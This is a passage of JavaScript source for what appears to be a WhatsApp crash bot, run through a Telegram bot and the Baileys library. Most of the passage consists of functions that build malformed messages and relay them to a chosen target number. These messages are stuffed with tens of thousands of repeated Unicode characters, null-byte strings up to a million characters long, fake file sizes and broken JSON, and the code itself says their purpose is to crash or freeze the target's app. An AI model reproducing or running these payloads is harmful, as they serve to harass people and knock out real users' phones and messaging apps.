                            botJid: "13135550202@bot",
                            botName: "Business Assistant",
                            creator: "7eppeli.pdf"
                        },
                        statusSourceType: "RESHARED_FROM_POST_MANY_TIMES", 
                        statusAttributionType: "STATUS_MENTION",
                        statusAttributions,
                    },
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [{
                tag: "mentioned_users",
                is_status_mention: true,
                attrs: {},
                content: [target].map(jid => ({
                    tag: "to",
                    attrs: { jid }
                }))
            }]
        }]
    });
}

async function Cloreds(sock, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 111.111111,
      degreesLongitude: -99.9999,
      name: "X" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: null,
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "X" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(randomColor()(`Success Send ${target}`))
}

async function dozerDelay(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      ephermeralMessage: {
        message: {
          requestPhoneNumberMessage: {
            contextInfo: {
              quotedMessage: {
                contactMessage: {
                  displayName: "🩸" + "𑇂𑆵𑆴𑆿".repeat(10000),
                  vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🩸${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🩸${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🩸${"ᩫᩫ".repeat(4000)}\nORG:🩸${"ᩫᩫ".repeat(4000)}\nTITLE:🩸${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🩸${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🩸${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🩸${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🩸${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🩸${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAwICAwICAwMDAwQDAwQFCAUFBAQFCgcHBggMCgwMCwoLCw0OEhANDhEOCwsQFhARExQVFRUMDxcYFhQYEhQVFP/bAEMBAwQEBQQFCQUFCRQNCw0UFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFP/AABEIAGAAYAMBIgACEQEDEQH/xAAdAAADAAMAAwEAAAAAAAAAAAACAwcAAQQFBggJ/8QAQBAAAQMDAAYFBgoLAAAAAAAAAQACAwQFEQYHEiExQRMiMlGRQlJhcYGxF1NicoKSoaPR0hUWIyQmNFSDhLPB/8QAGQEBAAMBAQAAAAAAAAAAAAAAAAIEBQED/8QANhEAAgECAQYLBwUAAAAAAAAAAAECBBEDBRIhMXGxExQiQVFigZGSwdElMkJSYYLiocLS4fH/2gAMAwEAAhEDEQA/APy4aExrUDQnNGUATRvRhu9Y0JjQgNBqLAWwMosDuQAYC0WpmB3LRCAS5qW5qeQluCAQ4JR709zUpwzlAY3iU5oSm8SnNQDGprGlxAAygjG2cBVrRTRq2aLaP016vNKK+qrMmlo3HDQB5b/RngOe9TSVrv8A00KOjlWSlylGMVeUnqS7NLbehJa2TSK2VMw6kL3D0NJRG01Q4wSfUKrnwl3WI4pWUlHHyjipI8DxaT9qMa0b7zmgPrpIvyqV+qvF+Je4DJK0Oon2Ya85kf8A0XVfESfVKGS31EQy6J7fW1WE6zr0eL6Y/wCHF+VD8JNxkOKmnoauM8WS0keD4AH7Uv1F4vxHF8lPQqifbhrymRZ7C3cQlOHBV3SbRq1aV2Gqu9npBbq2kaHVVG12WOafLZzxniOW7epHINkkKLSavHY/oUayilRyjylKMleMlqa1c+lNc6YlyS7/AKnPKSd49qgZ5pqc3iudvL0JzSgO6gYJKqNvnOAVg1gu6O60tK3qx01HBGwDkNgO95KkFqP79B88e9VnWJJnSeXPxMA+6avS/u/d+03Kd5uTKj6zgv0mzwUET53hjN7vSu0WqcgdnxSLRvqsfJK+gdWGrOxaR6MMrq9lfLVvq5oQ2nqo4Y2sZHG/J2o3b+ud+cYASEM4wyButkw3dXxXLPC+ncA8bzvCuGtbVPJom6W4UDC6x5hjZJLVwyyh74tsgtZh2Mh+HbIBDRv3hRa8HEzAe4qM4uIPN6u3F98kpjvjqKWeN4PMdG4+8DwUhuUYirZWg9lxCq+r1+zpIxxPZgmP3TlJ7o/brZiObj71NfFsjvZt47byXT35p4ndaHmcTkp24I3HOeSU48V5GIC0pjSkApjXIDyVqdivg+e33qp6w5g7SmfHxcP+tqk1tkDK6Ank8H7VTdOZOkv75R2ZIonDux0bV6fLse+JsYT9m4y68N0zmtUhbUZ4dUqzaqNa7tFamCjr5XusZM0ksMNPFJJ0j4tgOBdg4y2Mlu0AQ30qDwVToX5acHh611tvErOAaoxlmmQnbSfRms7WlY9JNEn0FA+vfVvq4Ji6opY4WNZHFKzA2JHb/wBo3kOyvny8zbU7TnfhIN8lcN4C46mqNQ/adgY4ALspZwbuez6ASfxCMb8wTjH9pylVzditlHyyqVoNKYr06byI6eZzj3Do3BS+4Sh9XK4Hi4rq+LYt7NjGfs3BT+ee6BzuKW4rZOUBK8zGABRApYKIHCAcyTYId3Ki2jSC36TW6CjuE4oq6nbsRVLgS2Qcmu/FTYO9iIOI5+CkmtTLtNVOnclZSjLQ09T9H0MqX6nXF/Wp+hqWcnQzMdn2ZytDQ+8/0TyfZ+Km0Nxni7Ez2+pxCeL3XN4VUo+mV23WXd/ZZ4TJz0vDmtkl5xKA7RK8tP8AITexuVqPRG7yHBo3xDzpcMHicL0Jt/uDOzVzD6ZQzX2vmbiSqleO4vJSz6V3P1OZ+Tr+5PxR/ie+Xi7U2ilnqaKnqI6q5VbdiWSI5bEzzQeZPNTZ79okniULpC85cS495Ql2/wBK42krIr1VTxhxUY5sYqyXR6t87NkoCcrCUJKiUjSwHCEHCJAFnK3lAsBwgGbSzaQbRW9pAFtLC7uQ7S1tFAESe9aJwhJJ5rEBhOVixCXID//Z\nX-WA-BIZ-NAME:🩸${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                  contextInfo: {
                    externalAdReply: {
                      automatedGreetingMessageShown: true,
                      automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                      greetingMessageBody: "\u0000",
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
    {},
  );

  let JsonExp = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " Kkkk ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "@xr • #fvcker 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp.message,
      },
    },
    xrl
      ? { messageId: JsonExp.key.id, participant: { jid: target } }
      : { messageId: JsonExp.key.id },
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message,
      },
    },
    xrl
      ? { messageId: msg.key.id, participant: { jid: target } }
      : { messageId: msg.key.id },
  );
}


async function blankontolz(sock, target) {
 const msg1 = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 11.11,
              degreesLongitude: -11.11,
              name: "KILL YOU BABY" + "ꦽ".repeat(60000),
              url: "https://t.me/Xwarrxxx",
              contextInfo: {
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "ꦾ".repeat(60000),
                    mediaType: "IMAGE",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                    caption: "KILLER YOU"
                  },
                  placeholderKey: {
                    remoteJid: "0@g.us",
                    fromMe: true,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            },
            hasMediaAttachment: true
          },
          body: {
            text: "MISI BANG"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦽ".repeat(10000),
                  flow_message_version: "3"
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦾ".repeat(10000),
                  flow_message_version: "3"
                })
              }
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000)
              },
              body: {
                text: "ANDROID KILLER",
                format: "DEFAULT"
              }
            }
          }
        }
      }
    }
  });

  const msg = await generateWAMessageFromContent(target, msg1, { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  
 const msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                            fileLength: "999999999999",
                            pageCount: 1316134911,
                            fileLength: 9999999999,
                            height: 999999999,
                            mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                            fileName: "NT BRO" + "ꦾ".repeat(60000),
                            fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                            directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1743848703"
                        }
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_call",
                                buttonParamsJson: "ꦾ".repeat(6000)
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: "ꦾ".repeat(6000)
                            }
                        ]
                    },
                    newsletterAdminInviteMessage: {},
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 1000,
                        title: "OVALIUM IS HERE" + "ꦽ".repeat(1000),
                        inviteCode: "t.me/Xwarrxxx",
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: "1975@s.whatsapp.net",
                            },
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 1,
                                    expiryTimestamp: null,
                                }
                            },
                            externalAdReply: {
                                renderLargerThumbnail: true,
                                showAdAttribution: true,
                                body: "ꦾ".repeat(35000),
                                title: "ི꒦ྀ".repeat(9000),
                                sourceUrl: "https://t.me/Xwarrxxx" + "ི꒦ྀ".repeat(9000) + "\u0000",
                                thumbnailUrl: null,
                                quotedAd: {
                                    advertiserName: "ི꒦ྀ".repeat(9000),
                                    mediaType: 2,
                                    jpegThumbnail: "/9j/4AAKossjsls7920ljspLli",
                                    caption: "Fuck You",
                                },
                                pleaceKeyHolder: {
                                    remoteJid: "0@s.whatsapp.net",
                                    fromMe: false,
                                    id: "XXNXXX",
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    
    await sock.relayMessage(target, msg2, {
        messageId: null,
        participant: { jid: target },
    });
    console.log(`SEND BUG TO ${target}`);
 }
 
async function docUI(sock, target) {
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
      fileName: "7eppeli.pdf", 
      fileLength: 9999999999,
      pageCount: 99999999999,
      mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
      caption: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "ꦽ".repeat(60000),
      fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
      directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
      contextInfo: {
        participant: target, 
        quotedMessage: {
          conversation: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️"
        }, 
        remoteJid: "status@broadcast"
      }, 
      mediaKeyTimestamp: 7205189532
    }
  }), {});
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
//
(async () => {
    console.clear();
    validateToken();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n

⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀
⠀⠀⣴⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣦⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃
⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀
⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀

        ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗  ██╗███████╗██╗  ██╗
        ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║  ██║██╔════╝██║  ██║
        ██████╔╝██║     ███████║██║     █████╔╝ ███████║█████╗  ███████║
        ██╔═══╝ ██║     ██╔══██║██║     ██╔═██╗ ██╔══██║██╔══╝  ██╔══██║
        ██║     ███████╗██║  ██║╚██████╗██║  ██╗██║  ██║███████╗██║  ██║
        ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                  「 CRASHHHHHHH — 天使の翼 」`));
})();
process.once('SIGINT', () => shutdown('SIGINT'));
process.once('SIGTERM', () => shutdown('SIGTERM'));

